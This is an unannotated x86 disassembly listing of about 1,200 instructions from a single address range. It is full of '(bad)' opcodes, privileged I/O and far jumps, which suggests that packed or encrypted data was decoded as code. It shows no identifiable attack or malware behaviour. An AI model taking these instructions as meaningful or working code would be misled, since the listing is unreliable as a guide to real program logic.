  40b991:	xchg   DWORD PTR [ebp+ecx*2-0x6fe45830],esp
  40b998:	xchg   BYTE PTR [ecx-0xb0c537c],ah
  40b99e:	outs   dx,BYTE PTR ds:[esi]
  40b99f:	mov    cl,0xfd
  40b9a2:	icebp  
  40b9a3:	imul   edi,edx,0xffffffc0
  40b9a6:	jmp    0x40ba0c
  40b9a8:	mov    eax,ds:0x589bd1b2
  40b9ad:	popa   
  40b9ae:	push   ss
  40b9af:	add    BYTE PTR [edx],bh
  40b9b1:	push   es
  40b9b2:	mov    ds:0xee07abf1,al
  40b9b7:	imul   ebp,DWORD PTR [ecx-0x601d6a3b],0xffffff9f
  40b9be:	outs   dx,BYTE PTR ds:[esi]
  40b9bf:	mov    ds:0x3310d5c3,al
  40b9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c5:	push   esi
  40b9c6:	neg    DWORD PTR [edx+ecx*4-0x55]
  40b9ca:	out    dx,al
  40b9cb:	sub    edx,edx
  40b9cd:	add    ah,BYTE PTR [ecx-0x71ee126c]
  40b9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d4:	inc    esp
  40b9d5:	imul   ecx,DWORD PTR [eax+eax*8-0x3d],0xa00a362e
  40b9dd:	hlt    
  40b9de:	out    dx,al
  40b9df:	jl     0x40b979
  40b9e1:	sub    BYTE PTR [edi+0x3c],ah
  40b9e4:	dec    DWORD PTR [esi]
  40b9e6:	fldenv [eax+0x4bec3ef]
  40b9ec:	into   
  40b9ed:	clc    
  40b9ee:	jge    0x40ba34
  40b9f0:	dec    edi
  40b9f1:	pushf  
  40b9f2:	and    eax,0x8a60c8c0
  40b9f7:	pusha  
  40b9f8:	xchg   ebx,eax
  40b9f9:	jg     0x40b9b6
  40b9fb:	push   ebx
  40b9fc:	pop    esi
  40b9fd:	sub    DWORD PTR [ebp-0x3a],ebx
  40ba00:	data16 mov WORD PTR [edx+0x1a],gs
  40ba04:	daa    
  40ba05:	inc    ebx
  40ba06:	inc    bx
  40ba08:	sub    ah,BYTE PTR [ecx+0x3f422fc4]
  40ba0e:	pop    edi
  40ba0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba10:	pop    esi
  40ba11:	fwait
  40ba12:	retf   
  40ba13:	sahf   
  40ba14:	sbb    ebp,ebx
  40ba16:	mov    BYTE PTR [ecx+0x530560ca],bh
  40ba1c:	mov    ah,bl
  40ba1e:	or     ebp,DWORD PTR [edx+0x51b2d20c]
  40ba24:	out    0x60,eax
  40ba26:	ds (bad) 
  40ba28:	es push esp
  40ba2a:	out    dx,eax
  40ba2b:	adc    eax,edi
  40ba2d:	pusha  
  40ba2e:	pop    esp
  40ba2f:	ror    BYTE PTR [ebx+0xf],0x9d
  40ba33:	adc    DWORD PTR [esi-0x770011a4],ebx
  40ba39:	outs   dx,BYTE PTR ds:[esi]
  40ba3a:	(bad)  
  40ba3c:	adc    dh,bl
  40ba3e:	out    0xa2,eax
  40ba40:	retf   
  40ba41:	inc    edi
  40ba42:	sbb    edx,DWORD PTR [ecx+0x68]
  40ba45:	pushf  
  40ba46:	cs add al,0xc8
  40ba49:	pop    esp
  40ba4a:	out    0x68,eax
  40ba4c:	mov    ebp,0xecd2b66
  40ba51:	or     bh,BYTE PTR [ebp-0x71]
  40ba54:	mov    ecx,0x822a0160
  40ba59:	dec    ebp
  40ba5a:	cs ss pop es
  40ba5d:	rol    DWORD PTR [ecx],1
  40ba5f:	mov    esi,0x972e4c92
  40ba64:	adc    eax,DWORD PTR [ecx-0x4f]
  40ba67:	xor    DWORD PTR [ecx+eiz*2],edi
  40ba6a:	sbb    al,BYTE PTR [edx]
  40ba6c:	shl    esi,1
  40ba6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba6f:	lods   al,BYTE PTR ds:[esi]
  40ba70:	push   edx
  40ba71:	adc    ebp,esi
  40ba73:	mov    bh,0x23
  40ba75:	dec    ecx
  40ba76:	mov    eax,ds:0xa842ec83
  40ba7b:	xchg   BYTE PTR [eax],ch
  40ba7d:	pop    edx
  40ba7e:	cld    
  40ba7f:	bound  ebp,QWORD PTR [edi]
  40ba81:	push   ds
  40ba82:	jg     0x40baf6
  40ba84:	jmp    0x7502274f
  40ba89:	test   dh,ch
  40ba8b:	jmp    0x40ba4c
  40ba8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8e:	ret    
  40ba8f:	outs   dx,BYTE PTR ds:[esi]
  40ba90:	(bad)  
  40ba91:	outs   dx,BYTE PTR ds:[esi]
  40ba92:	(bad)  [eax-0x1683e12d]
  40ba98:	test   BYTE PTR [ebx+0x5b],bh
  40ba9b:	sbb    DWORD PTR [ebx+0x4],0xd0c60d07
  40baa2:	imul   esp,DWORD PTR [esp+ecx*1-0xfae944a],0x24
  40baaa:	(bad)  
  40baab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baac:	pop    edx
  40baad:	or     al,0xaa
  40baaf:	jae    0x40bb30
  40bab1:	mov    al,ds:0x2284af87
  40bab6:	out    dx,al
  40bab7:	or     eax,0xed981539
  40babc:	pop    edi
  40babd:	mov    ebp,0x67c4a0c6
  40bac2:	jecxz  0x40bb28
  40bac4:	sbb    cl,BYTE PTR [edx]
  40bac6:	popf   
  40bac7:	cwde   
  40bac8:	pop    esi
  40bac9:	inc    edi
  40bacb:	xchg   BYTE PTR [edx+0x6f8c4278],ah
  40bad1:	and    al,0x51
  40bad3:	mov    eax,ds:0x63268367
  40bad8:	cli    
  40bad9:	pop    esi
  40bada:	jb     0x40bb33
  40badc:	jmp    0x2118:0x356c0a80
  40bae3:	and    DWORD PTR [ebx-0x1],esi
  40bae6:	xchg   edi,eax
  40bae7:	fs int 0x33
  40baea:	test   BYTE PTR [ebx-0x2dcebfc9],ah
  40baf0:	or     DWORD PTR [ebx+0x2b],ebp
  40baf3:	cdq    
  40baf4:	fbld   TBYTE PTR [ecx-0x72cfda9a]
  40bafa:	out    dx,al
  40bafb:	cmp    eax,0xe4f3e545
  40bb00:	in     eax,0x52
  40bb02:	or     ah,BYTE PTR [ecx-0x3cc6ba69]
  40bb08:	adc    bl,ch
  40bb0a:	dec    ebp
  40bb0b:	adc    bl,BYTE PTR [esi+0x28]
  40bb0e:	rol    DWORD PTR [esp+ebp*2-0x4e],1
  40bb12:	pop    esp
  40bb13:	mov    ah,0x71
  40bb15:	pop    ebp
  40bb16:	push   ebp
  40bb17:	pushf  
  40bb18:	pushf  
  40bb19:	stc    
  40bb1a:	inc    ebx
  40bb1b:	int    0x96
  40bb1d:	cdq    
  40bb1e:	dec    ebx
  40bb1f:	(bad)  
  40bb20:	pop    edi
  40bb21:	pop    ds
  40bb22:	aas    
  40bb23:	sar    BYTE PTR [ecx+0x506c060a],cl
  40bb29:	mov    eax,ds:0x55792250
  40bb2e:	mov    ebx,0xb7f5faaa
  40bb33:	mov    al,ds:0xbd725c49
  40bb38:	(bad)  
  40bb39:	push   ecx
  40bb3a:	or     eax,0x4ed116a9
  40bb3f:	ret    
  40bb40:	fwait
  40bb41:	out    0xb4,al
  40bb43:	jp     0x40bb2e
  40bb45:	out    dx,eax
  40bb46:	out    dx,al
  40bb47:	lea    esp,[ebp+0x30dbab38]
  40bb4d:	shl    BYTE PTR [edx-0x619f5498],1
  40bb53:	data16 (bad) 
  40bb55:	cwde   
  40bb56:	mov    edi,DWORD PTR [ecx+0x2f]
  40bb59:	push   edx
  40bb5a:	in     eax,dx
  40bb5b:	and    al,0x80
  40bb5d:	rol    edi,cl
  40bb5f:	shl    BYTE PTR [esi+0x45db3aa4],cl
  40bb65:	inc    edx
  40bb66:	xchg   edx,eax
  40bb67:	and    al,0x39
  40bb69:	pop    edi
  40bb6a:	fwait
  40bb6b:	add    bh,BYTE PTR [ebp+edi*8-0x17718cd2]
  40bb72:	out    dx,al
  40bb73:	nop
  40bb74:	pop    ebp
  40bb75:	fs push ebp
  40bb77:	fs xor al,0x82
  40bb7a:	pop    ebp
  40bb7b:	test   al,0x61
  40bb7d:	loop   0x40bb39
  40bb7f:	mov    ebx,0x3181411a
  40bb84:	push   esp
  40bb85:	fadd   DWORD PTR [ecx]
  40bb87:	mov    al,cl
  40bb89:	shr    BYTE PTR [esi],1
  40bb8b:	jae    0x40bb39
  40bb8d:	cs retf 0x1d50
  40bb91:	and    al,0x87
  40bb93:	mov    eax,ds:0x35e6e023
  40bb98:	in     eax,0xf4
  40bb9a:	jo     0x40bb62
  40bb9c:	pop    ecx
  40bb9d:	lea    ecx,[edx]
  40bb9f:	mov    esp,eax
  40bba1:	dec    ebp
  40bba2:	sub    eax,0x1dc79637
  40bba7:	jge    0x40bb4f
  40bba9:	xor    edx,DWORD PTR [edi-0x5f]
  40bbac:	nop
  40bbad:	mov    ecx,0x830afad7
  40bbb2:	adc    ebx,DWORD PTR [esp+eiz*2]
  40bbb5:	jmp    0x4f68148c
  40bbba:	out    0x45,eax
  40bbbc:	jae    0x40bc29
  40bbbe:	icebp  
  40bbbf:	mov    ds:0x8209d792,eax
  40bbc4:	push   eax
  40bbc5:	outs   dx,BYTE PTR ds:[esi]
  40bbc6:	dec    esi
  40bbc7:	repz adc si,bp
  40bbcb:	in     eax,0x1f
  40bbcd:	xor    dl,cl
  40bbcf:	lock std 
  40bbd1:	cmp    eax,0x6130f0da
  40bbd6:	inc    ebx
  40bbd7:	lds    esp,FWORD PTR [ecx+eiz*4-0x30636858]
  40bbde:	out    dx,eax
  40bbdf:	xlat   BYTE PTR ds:[ebx]
  40bbe0:	xchg   ebx,eax
  40bbe1:	fdivr  QWORD PTR [ecx-0x77b22474]
  40bbe7:	sahf   
  40bbe8:	dec    esi
  40bbe9:	pop    es
  40bbea:	lea    ecx,[esi+0x3f]
  40bbed:	popa   
  40bbee:	inc    esi
  40bbef:	jb     0x40bc4b
  40bbf1:	pusha  
  40bbf2:	or     ecx,esi
  40bbf4:	mov    al,0x87
  40bbf6:	out    dx,al
  40bbf7:	pop    ebp
  40bbf8:	fidiv  WORD PTR [esp+edx*4+0x6f]
  40bbfc:	sub    al,0xff
  40bbfe:	into   
  40bbff:	mov    ds:0x77f8dece,eax
  40bc04:	sub    BYTE PTR [ecx],bl
  40bc06:	aas    
  40bc07:	add    edx,esi
  40bc09:	fcom   st(6)
  40bc0b:	dec    esp
  40bc0c:	xor    DWORD PTR [ebp+0x25a0a140],edi
  40bc12:	in     al,dx
  40bc13:	icebp  
  40bc14:	fild   DWORD PTR [eax-0x7b]
  40bc17:	mov    eax,ds:0x174c6547
  40bc1c:	xchg   edi,eax
  40bc1d:	adc    eax,0x8a5e8035
  40bc22:	inc    esp
  40bc23:	outs   dx,BYTE PTR ds:[esi]
  40bc24:	jmp    0x40bc22
  40bc26:	in     eax,0x8e
  40bc28:	push   ebp
  40bc29:	popa   
  40bc2a:	dec    ebx
  40bc2b:	inc    esp
  40bc2c:	call   0xee36:0xe37ef2e
  40bc33:	rol    BYTE PTR [edi+edi*1],0x59
  40bc37:	pop    eax
  40bc38:	mov    eax,0x188d9b7f
  40bc3d:	imul   eax,DWORD PTR [edi+0x5b1f6ee1],0x14
  40bc44:	mov    ds:0x6335e5b1,al
  40bc49:	lahf   
  40bc4a:	sbb    eax,0x89a133f9
  40bc4f:	ret    0x4940
  40bc52:	mov    ds:0xbb01a4,al
  40bc57:	sti    
  40bc58:	enter  0x4656,0x71
  40bc5c:	jge    0x40bc3d
  40bc5e:	jmp    0x40bc83
  40bc60:	jmp    0x40bc85
  40bc62:	pop    eax
  40bc63:	jmp    0x6090:0x1cf1e10b
  40bc6a:	mov    ah,0x66
  40bc6c:	and    bl,BYTE PTR [esi+0x6dd2fd71]
  40bc72:	fisttp QWORD PTR [ebx]
  40bc74:	pop    ebx
  40bc75:	sti    
  40bc76:	push   esp
  40bc77:	inc    eax
  40bc78:	ja     0x40bc57
  40bc7a:	sahf   
  40bc7b:	int    0x4c
  40bc7d:	xor    al,0x19
  40bc7f:	mov    eax,ds:0xa467a698
  40bc84:	cmp    al,0xa2
  40bc86:	les    ecx,FWORD PTR [eax+0x6a33b05d]
  40bc8c:	add    al,0xef
  40bc8e:	push   eax
  40bc8f:	test   eax,0xa2012d76
  40bc94:	jge    0xee8fb415
  40bc9a:	inc    eax
  40bc9c:	out    dx,eax
  40bc9d:	sbb    ebp,esi
  40bc9f:	scas   al,BYTE PTR es:[edi]
  40bca0:	push   DWORD PTR [ebx-0x755ab205]
  40bca6:	icebp  
  40bca7:	mov    al,ds:0xb585ac13
  40bcac:	inc    ebx
  40bcad:	es hlt 
  40bcaf:	leave  
  40bcb0:	xor    al,0x46
  40bcb2:	sub    eax,0x23992c21
  40bcb7:	pop    esp
  40bcb8:	jb     0x40bcac
  40bcba:	dec    ecx
  40bcbb:	mov    eax,ds:0xba3a761
  40bcc0:	stos   BYTE PTR es:[edi],al
  40bcc1:	ins    BYTE PTR es:[edi],dx
  40bcc2:	fdivr  st(5),st
  40bcc4:	pop    ebp
  40bcc5:	dec    ecx
  40bcc6:	mov    fs,WORD PTR es:[ebp-0x78]
  40bcca:	inc    ebx
  40bccb:	popf   
  40bccc:	sahf   
  40bccd:	or     bh,bh
  40bccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd0:	sbb    al,cl
  40bcd2:	arpl   di,bx
  40bcd4:	nop
  40bcd5:	adc    BYTE PTR [esi-0x14],ch
  40bcd8:	jo     0x40bd42
  40bcda:	dec    esi
  40bcdb:	loop   0x40bcb3
  40bcdd:	shl    ch,cl
  40bcdf:	push   cs
  40bce0:	pop    esi
  40bce1:	xlat   BYTE PTR ds:[ebx]
  40bce2:	jp     0x40bd34
  40bce4:	inc    edi
  40bce5:	leave  
  40bce6:	int3   
  40bce7:	mov    esi,0xdc2c60d3
  40bcec:	pusha  
  40bced:	repz aaa 
  40bcef:	ficom  DWORD PTR [edi+0x53bfee28]
  40bcf5:	sbb    al,0x34
  40bcf7:	lock xchg edx,eax
  40bcf9:	rcl    BYTE PTR [bp+si+0x31a5],cl
  40bcfe:	out    dx,eax
  40bcff:	mov    al,ds:0x67410e86
  40bd04:	retf   
  40bd05:	stos   DWORD PTR es:[edi],eax
  40bd06:	jle    0x40bd78
  40bd08:	pop    esi
  40bd09:	and    esp,DWORD PTR [ebx+0x1f2a4302]
  40bd0f:	adc    al,0x8b
  40bd11:	scas   al,BYTE PTR es:[edi]
  40bd12:	into   
  40bd13:	jnp    0x40bd82
  40bd15:	adc    eax,0x614b9d46
  40bd1a:	dec    eax
  40bd1b:	gs push eax
  40bd1d:	fadd   QWORD PTR [edi-0x11562c72]
  40bd23:	cmp    BYTE PTR [eax-0x22a1a254],0x2b
  40bd2a:	sti    
  40bd2b:	mov    al,ds:0x295b577c
  40bd30:	jne    0x40bda2
  40bd32:	inc    esp
  40bd33:	mov    ebp,0x3dd44c5e
  40bd38:	scas   eax,DWORD PTR es:[edi]
  40bd39:	xchg   edx,eax
  40bd3a:	frstor [eax]
  40bd3c:	cli    
  40bd3d:	push   edx
  40bd3e:	int3   
  40bd3f:	cmc    
  40bd40:	sahf   
  40bd41:	popf   
  40bd42:	mov    gs,eax
  40bd44:	fstp   TBYTE PTR [ebx]
  40bd46:	lods   al,BYTE PTR ds:[esi]
  40bd47:	push   cs
  40bd48:	pop    esi
  40bd49:	mov    eax,0xabef8dd5
  40bd4e:	dec    ebp
  40bd4f:	inc    edx
  40bd50:	sbb    DWORD PTR [ecx-0x26],esp
  40bd53:	ja     0x40bda3
  40bd55:	ror    DWORD PTR [ecx+0x7],0xe1
  40bd59:	sbb    esi,ebp
  40bd5b:	add    esp,DWORD PTR [esi]
  40bd5d:	push   ds
  40bd5e:	dec    ebx
  40bd5f:	sar    ebp,0x56
  40bd62:	or     eax,0x82929ea8
  40bd67:	les    eax,FWORD PTR [ebx]
  40bd69:	push   ecx
  40bd6a:	fisttp QWORD PTR [esi-0x2]
  40bd6d:	fucomi st,st(5)
  40bd6f:	pop    esp
  40bd70:	icebp  
  40bd71:	ret    
  40bd72:	icebp  
  40bd73:	xchg   DWORD PTR [ecx+0x56],edi
  40bd76:	aam    0x30
  40bd78:	push   esp
  40bd79:	jmp    0x40bddf
  40bd7b:	int3   
  40bd7c:	pop    esi
  40bd7d:	shl    DWORD PTR [edi-0x3e],1
  40bd80:	out    0x4,al
  40bd82:	sbb    BYTE PTR [eax+ebp*1+0x61],cl
  40bd86:	pop    ds
  40bd87:	popf   
  40bd88:	push   esi
  40bd89:	test   al,0xe2
  40bd8b:	or     DWORD PTR [esi+0x4eaeef97],0xffffffac
  40bd92:	mul    BYTE PTR [eax+0x10987def]
  40bd98:	mov    esp,0xac96051
  40bd9d:	sub    BYTE PTR [esi+0x29],cl
  40bda0:	aaa    
  40bda1:	push   esp
  40bda2:	fdivrp st(5),st
  40bda4:	pop    edi
  40bda5:	or     ebx,DWORD PTR [ebx]
  40bda7:	sbb    al,0x49
  40bda9:	sbb    eax,ebp
  40bdab:	and    BYTE PTR [ebx-0x7f],dl
  40bdae:	jecxz  0x40bd50
  40bdb0:	outs   dx,DWORD PTR ds:[esi]
  40bdb1:	adc    esp,DWORD PTR [eax]
  40bdb3:	xchg   edi,eax
  40bdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb5:	mov    dl,0xe4
  40bdb7:	ds pop edi
  40bdb9:	jbe    0x40bd5e
  40bdbb:	sbb    dh,BYTE PTR [eax-0x73]
  40bdbe:	sub    bl,BYTE PTR [ecx-0x20]
  40bdc1:	add    al,0x43
  40bdc3:	mov    eax,ds:0xd2ce555d
  40bdc8:	xchg   BYTE PTR [esi-0x64],dl
  40bdcb:	mov    dl,0x5e
  40bdcd:	and    bh,BYTE PTR [eax+0xd]
  40bdd0:	inc    edi
  40bdd1:	cmp    DWORD PTR [esi-0xe9f5c48],0x465842e8
  40bddb:	pop    edx
  40bddc:	xor    BYTE PTR [ebp-0x12],bl
  40bddf:	jg     0x40bd93
  40bde1:	pop    ecx
  40bde2:	add    ah,0xe3
  40bde5:	rcl    bl,0xa0
  40bde8:	ins    BYTE PTR es:[edi],dx
  40bde9:	leave  
  40bdea:	xor    bh,BYTE PTR ds:0xf3a9fdc7
  40bdf0:	pop    esi
  40bdf1:	das    
  40bdf2:	mov    es,WORD PTR ds:0xac478716
  40bdf8:	jne    0x40bdfe
  40bdfa:	fbstp  TBYTE PTR [ebp-0xe1f509d]
  40be00:	push   ds
  40be01:	mov    edi,0xe1b8338c
  40be06:	out    dx,al
  40be07:	lahf   
  40be08:	and    ecx,DWORD PTR [edi-0x13]
  40be0b:	push   ecx
  40be0c:	jns    0x40be82
  40be0e:	inc    edi
  40be0f:	mov    eax,ds:0x66f8fb10
  40be14:	in     al,0xa2
  40be16:	mov    cl,0x4
  40be18:	pop    esi
  40be19:	ret    
  40be1a:	ficomp DWORD PTR [edx+0x300f50d2]
  40be20:	push   ss
  40be21:	push   ebx
  40be22:	fldenv [edx+0x4d]
  40be25:	aas    
  40be26:	push   cs
  40be27:	retf   0x1339
  40be2a:	idiv   BYTE PTR [esi+0x115edd5f]
  40be30:	push   cs
  40be31:	push   edx
  40be32:	xchg   BYTE PTR [ecx+0x1c],dh
  40be35:	sbb    eax,0x3618a82b
  40be3a:	add    DWORD PTR [edx-0x24],edi
  40be3d:	mov    al,0x6c
  40be3f:	push   0xd0ee6cb0
  40be44:	mov    al,ds:0xe9d3b92f
  40be49:	stos   DWORD PTR es:[edi],eax
  40be4a:	imul   esp,DWORD PTR [ecx+0x5a9d6a30],0xfed8eb5a
  40be54:	inc    edx
  40be55:	mov    ebp,0x4a5eab0c
  40be5a:	fbld   TBYTE PTR [ebx+ebx*1+0x57]
  40be5e:	jge    0x40be4f
  40be60:	nop
  40be61:	pusha  
  40be62:	scas   al,BYTE PTR es:[edi]
  40be63:	lahf   
  40be64:	cmp    bl,BYTE PTR [ebp+0x2]
  40be67:	stos   DWORD PTR es:[edi],eax
  40be68:	xchg   esp,eax
  40be69:	inc    ebx
  40be6a:	out    dx,al
  40be6b:	sbb    dh,BYTE PTR [edx-0x2c47d709]
  40be71:	adc    DWORD PTR [ebp-0x5f],eax
  40be74:	adc    eax,0x8d498972
  40be79:	leave  
  40be7a:	pop    ebx
  40be7b:	sbb    al,0xf7
  40be7d:	dec    esp
  40be7e:	out    dx,al
  40be7f:	adc    al,0x5
  40be81:	in     al,0xe1
  40be83:	push   ds
  40be84:	in     al,dx
  40be85:	pop    edi
  40be86:	loop   0x40be28
  40be88:	jge    0x40be24
  40be8a:	imul   edi,DWORD PTR [ebx-0x76],0xffffff80
  40be8e:	call   0x625e:0xa9e85ef2
  40be95:	call   0x16d5:0x8c8d3ec
  40be9c:	pop    esi
  40be9d:	fimul  DWORD PTR [eax+0x11]
  40bea0:	xor    esi,DWORD PTR [edi+esi*8]
  40bea3:	dec    ebp
  40bea4:	(bad)
  40bea8:	jo     0x40beb6
  40beaa:	sar    BYTE PTR [edx],1
  40beac:	push   edi
  40bead:	mov    eax,ds:0x608eecd6
  40beb2:	lds    edx,FWORD PTR [ecx]
  40beb4:	ds jae 0x40bf16
  40beb7:	lods   al,BYTE PTR ds:[esi]
  40beb8:	pusha  
  40beb9:	call   0xbc1e:0x4cfbd6ee
  40bec0:	push   ebx
  40bec1:	inc    esi
  40bec2:	cdq    
  40bec3:	mov    eax,ds:0x4010485
  40bec8:	inc    eax
  40bec9:	xor    BYTE PTR [ecx+0x53],0x5b
  40becd:	push   0xe51b09f4
  40bed2:	add    BYTE PTR [ecx+0x1be88494],al
  40bed8:	jp     0x40bf3a
  40beda:	jb     0x40bed7
  40bedc:	xor    ah,BYTE PTR [edx]
  40bede:	sahf   
  40bedf:	xchg   DWORD PTR ds:0xf72eeeca,ebp
  40bee5:	sub    ebp,ebx
  40bee7:	bound  esp,QWORD PTR [esi+ebx*8]
  40beea:	mul    BYTE PTR [eax-0x6ddd412c]
  40bef0:	rol    DWORD PTR [edx-0x47a11c39],0xbb
  40bef7:	clc    
  40bef8:	adc    al,0xef
  40befa:	dec    ebx
  40befb:	inc    ecx
  40befc:	mov    eax,0xe96963b8
  40bf01:	xor    dh,cl
  40bf03:	cdq    
  40bf04:	fild   WORD PTR [eax+0x36e38711]
  40bf0a:	out    dx,al
  40bf0b:	iret   
  40bf0c:	je     0x40bf34
  40bf0e:	and    esp,DWORD PTR [edi]
  40bf10:	pop    esi
  40bf11:	or     al,0x28
  40bf13:	sbb    cl,dh
  40bf15:	stc    
  40bf16:	mov    bh,0x9f
  40bf18:	inc    eax
  40bf19:	popa   
  40bf1a:	mov    esi,0xc0cce09e
  40bf1f:	fs out 0x35,eax
  40bf22:	out    dx,eax
  40bf23:	cli    
  40bf24:	cmp    edi,ecx
  40bf26:	jnp    0x40beb0
  40bf28:	inc    ecx
  40bf29:	lock push ds
  40bf2b:	adc    DWORD PTR [ebx+0x77],edx
  40bf2e:	pop    ebx
  40bf2f:	outs   dx,DWORD PTR ds:[esi]
  40bf30:	pop    ecx
  40bf31:	popa   
  40bf32:	sahf   
  40bf33:	sub    BYTE PTR [edi+0x62aef94e],dh
  40bf39:	adc    bl,cl
  40bf3b:	xor    eax,0x632314f8
  40bf40:	mov    dh,0x60
  40bf42:	or     eax,DWORD PTR [eax+edi*1]
  40bf45:	sbb    BYTE PTR [esi],bh
  40bf47:	inc    esp
  40bf48:	fs gs sbb edi,esi
  40bf4c:	pop    esi
  40bf4d:	out    0xc6,al
  40bf4f:	add    ecx,esp
  40bf51:	and    edx,DWORD PTR [esi]
  40bf53:	or     DWORD PTR [ebx-0x44],ebx
  40bf56:	repnz xchg ebx,eax
  40bf58:	mov    ?,edx
  40bf5a:	ds sahf 
  40bf5c:	inc    ecx
  40bf5d:	or     BYTE PTR [edi-0x5c660559],ah
  40bf63:	mov    eax,0xd0b89a36
  40bf68:	iret   
  40bf69:	jns    0x40bfdc
  40bf6b:	inc    ebp
  40bf6c:	pop    esi
  40bf6d:	mov    ds:0xe22cf945,eax
  40bf72:	dec    eax
  40bf73:	fsub   st,st(7)
  40bf75:	pusha  
  40bf76:	lods   al,BYTE PTR ds:[esi]
  40bf77:	sub    al,dl
  40bf79:	dec    esp
  40bf7a:	pop    esi
  40bf7b:	dec    esp
  40bf7c:	mov    dl,0xce
  40bf7e:	out    dx,al
  40bf7f:	sub    eax,0xce493e39
  40bf84:	sbb    cl,bl
  40bf86:	in     eax,0x7c
  40bf88:	sub    cl,BYTE PTR [edi+0x7]
  40bf8b:	fs (bad) 
  40bf8d:	pop    ecx
  40bf8e:	sbb    eax,0x2480671d
  40bf93:	push   edx
  40bf94:	xchg   ecx,eax
  40bf95:	loopne 0x40bff5
  40bf97:	push   ss
  40bf98:	adc    BYTE PTR [eax+0x23],ah
  40bf9b:	sbb    BYTE PTR [eax+0x61],dl
  40bf9e:	pop    ds
  40bf9f:	fld    QWORD PTR [esp+edi*4+0xf]
  40bfa3:	gs sub al,dl
  40bfa6:	out    dx,al
  40bfa7:	jp     0x40bfa6
  40bfa9:	pop    esp
  40bfaa:	call   0x8edc8ff3
  40bfaf:	mov    eax,ds:0x84e7a7e5
  40bfb4:	pop    ds
  40bfb5:	scas   eax,DWORD PTR es:[edi]
  40bfb6:	and    eax,0x64325ef0
  40bfbb:	aaa    
  40bfbc:	add    eax,0xfce3a08f
  40bfc1:	pusha  
  40bfc2:	fucomp st(3)
  40bfc4:	sbb    bh,dl
  40bfc6:	push   ds
  40bfc7:	je     0x40c01b
  40bfc9:	out    0xee,al
  40bfcb:	fsub   st,st(1)
  40bfcd:	pop    edx
  40bfce:	mov    eax,ds:0x6f9a4211
  40bfd3:	mov    eax,ds:0x5d17b6f3
  40bfd8:	dec    edx
  40bfd9:	sbb    esi,ecx
  40bfdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfdc:	pop    esi
  40bfdd:	(bad)  
  40bfdf:	mov    edx,DWORD PTR [ebp-0x412ad1e5]
  40bfe5:	pusha  
  40bfe6:	scas   eax,DWORD PTR es:[edi]
  40bfe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfe8:	or     edi,ebp
  40bfea:	mov    ebp,0x21027920
  40bfef:	lea    ecx,[eax]
  40bff1:	popa   
  40bff2:	cmp    eax,0xab59edb7
  40bff7:	xchg   edx,eax
  40bff8:	push   0x5cc5d761
  40bffd:	mov    al,0xde
  40bfff:	ss gs cmp eax,0x24dd1fed
  40c006:	loopne 0x40bfe0
  40c008:	xor    DWORD PTR [esi+esi*1],0xffffffbf
  40c00c:	sti    
  40c00d:	pusha  
  40c00e:	leave  
  40c00f:	jmp    0xaef987e5
  40c014:	ins    DWORD PTR es:[edi],dx
  40c015:	imul   dh
  40c017:	leave  
  40c018:	xchg   esp,eax
  40c019:	pop    edi
  40c01a:	mov    WORD PTR [ebp-0x5b84759b],cs
  40c020:	xor    cl,BYTE PTR [edi-0x4d5d3aa]
  40c026:	dec    esi
  40c027:	scas   eax,DWORD PTR es:[edi]
  40c028:	push   es
  40c029:	mov    ch,0xe2
  40c02b:	jmp    0x40c0a5
  40c02d:	or     BYTE PTR [ebp-0x695037b6],0x55
  40c034:	dec    edx
  40c035:	pop    edi
  40c036:	fs xchg edx,eax
  40c038:	test   al,0x1
  40c03b:	leave  
  40c03c:	mov    esi,DWORD PTR [esi+ebp*4]
  40c03f:	inc    ebp
  40c040:	mov    ds:0xd938c82,al
  40c045:	and    ch,BYTE PTR [ebx]
  40c047:	mov    eax,ds:0x58d064af
  40c04c:	retf   0x83c6
  40c04f:	int    0x5e
  40c051:	push   edi
  40c052:	adc    al,0xc3
  40c054:	cmp    bl,BYTE PTR ss:[edx+0x62]
  40c058:	and    BYTE PTR [edi+0x3476a181],ah
  40c05e:	sub    BYTE PTR [ebp+0x4f49001d],ch
  40c064:	pop    ebp
  40c065:	sbb    al,0xf7
  40c067:	icebp  
  40c068:	inc    ecx
  40c069:	sahf   
  40c06a:	push   esp
  40c06b:	(bad)  
  40c06c:	xchg   esi,eax
  40c06d:	clc    
  40c06e:	inc    ecx
  40c06f:	mov    eax,ds:0x4cca1cc8
  40c074:	call   0x6b99:0x5e5fd3d6
  40c07b:	dec    edi
  40c07c:	clc    
  40c07d:	push   edi
  40c07e:	out    0xd3,eax
  40c080:	xchg   ecx,eax
  40c081:	pusha  
  40c082:	mov    al,gs:0xea38eea1
  40c088:	inc    ebx
  40c089:	mov    esi,0x665bde48
  40c08e:	out    0x31,al
  40c090:	je     0x40c0fb
  40c092:	or     eax,0x4694fefd
  40c097:	inc    edi
  40c098:	pop    ecx
  40c099:	popa   
  40c09a:	or     ecx,edi
  40c09c:	jb     0x40c04b
  40c09e:	jg     0x40c063
  40c0a0:	push   0xf16beeca
  40c0a5:	dec    ebp
  40c0a6:	(bad)  
  40c0a7:	scas   eax,DWORD PTR es:[edi]
  40c0a8:	push   edi
  40c0a9:	xor    DWORD PTR [edi-0x5f],esp
  40c0ac:	or     ch,BYTE PTR [ebx+esi*4]
  40c0af:	fwait
  40c0b0:	push   es
  40c0b1:	fild   WORD PTR [ecx+esi*2+0x5e30175e]
  40c0b8:	gs jmp 0xa0bc:0xc15c62e6
  40c0c0:	mov    ah,BYTE PTR [ecx+0x6dd9b82b]
  40c0c6:	cmp    al,0x7
  40c0c8:	pop    esi
  40c0c9:	call   0x491c:0x658b3963
  40c0d0:	mov    BYTE PTR [eax-0x3f],ah
  40c0d3:	ja     0x40c0df
  40c0d5:	mov    ah,0x19
  40c0d7:	mov    BYTE PTR [eax],cl
  40c0d9:	dec    esp
  40c0da:	out    dx,al
  40c0db:	stc    
  40c0dc:	cmp    BYTE PTR [edx+0x52],ch
  40c0df:	repnz mov cl,0x8b
